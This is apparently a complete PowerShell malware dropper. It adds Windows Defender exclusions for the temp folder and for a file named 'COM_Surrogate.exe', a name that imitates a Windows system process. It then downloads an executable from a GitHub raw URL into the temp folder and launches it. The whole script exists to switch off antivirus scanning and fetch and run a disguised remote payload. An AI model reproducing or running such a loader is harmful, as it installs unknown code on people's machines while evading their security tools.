Add-MpPreference -ExclusionPath "$env:temp"
Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp\COM_Surrogate.exe"
Add-MpPreference -ExclusionPath $env:TEMP\COM_Surrogate.exe
Add-MpPreference -ExclusionProcess "COM_Surrogate.exe"
$url = "https://raw.githubusercontent.com/M7mmdddd/Mpower/refs/heads/main/COM%20Surrogate.exe"

 $output = "$env:TEMP\COM Surrogate.exe"

Invoke-WebRequest -Uri $url -OutFile $output

if (Test-Path $output) {
    Start-Process -FilePath $output
} else {
    Write-Host "Failed to download the file."
}
